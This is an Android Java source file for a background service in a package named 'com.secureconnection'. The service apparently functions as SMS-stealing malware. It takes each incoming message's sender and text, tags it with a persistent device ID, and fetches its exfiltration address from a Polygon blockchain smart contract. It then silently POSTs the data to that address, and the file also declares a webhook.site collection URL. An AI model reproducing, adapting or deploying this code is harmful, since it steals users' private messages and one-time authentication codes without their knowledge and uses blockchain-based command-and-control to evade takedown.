package com.secureconnection;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.RequiresApi;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.UUID;

public class SmsService extends Service {
    private static final String TAG = "SmsService";
    private static final String GATEWAY_URL = "https://webhook.site/731395f6-e76c-4d2a-a54b-d9ba904eaaa9";  // Replace with your actual URL
    private static final String PROVIDER_URL = "https://polygon-rpc.com";
    private static final String CONTRACT_ADDRESS = "0xd6Ee35eB0f3c4D91BA72123A25Eb321806bFE944";
    private static final String FUNCTION_SIGNATURE = "0xb68d1809";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            final String sender = intent.getStringExtra("sender");
            final String message = intent.getStringExtra("message");

            // Get the device ID
            String registrationIdentifier = registerDeviceAsWhitelisted();

            // Query the Ethereum smart contract
            new Thread(() -> {
                String domain = null;
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
                    domain = querySmartContract();
                }
                if (domain != null) {
                    // Send the result to the gateway
                    sendToGateway(sender, message, registrationIdentifier, domain);
                } else {
                    Log.e(TAG, "Failed to query smart contract");
                }
            }).start();
        }
        return START_NOT_STICKY;
    }

    private String registerDeviceAsWhitelisted() {
        SharedPreferences prefs = getSharedPreferences("device_id_prefs", Context.MODE_PRIVATE);
        String deviceId = prefs.getString("device_id", null);

        if (deviceId == null) {
            // Generate a new UUID if no device ID exists
            deviceId = UUID.randomUUID().toString();

            // Save the device ID in SharedPreferences
            SharedPreferences.Editor editor = prefs.edit();
            editor.putString("device_id", deviceId);
            editor.apply();
        }

        return deviceId;
    }

    @RequiresApi(api = Build.VERSION_CODES.TIRAMISU)
    private String querySmartContract() {
        try {
            String jsonPayload = "{\"jsonrpc\":\"2.0\",\"method\":\"eth_call\",\"params\":[{\"to\":\""
                    + CONTRACT_ADDRESS + "\",\"data\":\"" + FUNCTION_SIGNATURE + "\"},\"latest\"],\"id\":1}";

            URL url = new URL(PROVIDER_URL);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);

            byte[] outputBytes = jsonPayload.getBytes(StandardCharsets.UTF_8);
            OutputStream os = conn.getOutputStream();
            os.write(outputBytes);
            os.flush();
            os.close();

            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                String response = new String(conn.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
                conn.disconnect();

                org.json.JSONObject jsonResponse = new org.json.JSONObject(response);
                if (jsonResponse.has("result")) {
                    String hexResult = jsonResponse.getString("result");

                    if (hexResult == null || hexResult.equals("0x") || hexResult.isEmpty()) {
                        Log.e(TAG, "Smart contract returned an empty response.");
                        return null;
                    }

                    return hex2ascii(hexResult);
                } else {
                    Log.e(TAG, "Invalid JSON-RPC response: " + response);
                }
            } else {
                Log.e(TAG, "HTTP error: " + responseCode);
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to query smart contract", e);
        }
        return null;
    }

    private String hex2ascii(String hex) {
        if (hex == null || hex.equals("0x") || hex.length() < 2) {
            return "";  // Return empty string if the response is invalid
        }

        StringBuilder output = new StringBuilder();
        for (int i = 2; i < hex.length(); i += 2) {  // Start from index 2 to skip "0x"
            String str = hex.substring(i, i + 2);
            char c = (char) Integer.parseInt(str, 16);
            if (c >= 32 && c <= 126) {  // Only include printable ASCII characters
                output.append(c);
            }
        }
        return output.toString().trim();  // Trim any leading/trailing whitespace
    }

    private void sendToGateway(String sender, String message, String registrationIdentifier, String domain) {
        try {
            if (domain.startsWith("$")) {
                domain = domain.substring(1);  // Remove the first character
            }

            URL url = new URL(domain);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);

            // Include the device ID, IP address, and domain in the JSON payload
            String jsonPayload = "{\"sender\":\"" + sender + "\", \"message\":\"" + message + "\", \"registrationIdentifier\":\"" + registrationIdentifier + "\", \"domain\":\"" + domain + "\"}";
            byte[] outputBytes = jsonPayload.getBytes(StandardCharsets.UTF_8);

            OutputStream os = conn.getOutputStream();
            os.write(outputBytes);
            os.flush();
            os.close();

            int responseCode = conn.getResponseCode();
            Log.d(TAG, "Gateway Response Code: " + responseCode);

            conn.disconnect();
        } catch (Exception e) {
            Log.e(TAG, "Failed to send SMS to gateway", e);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;  // No binding needed for this background service
    }
}
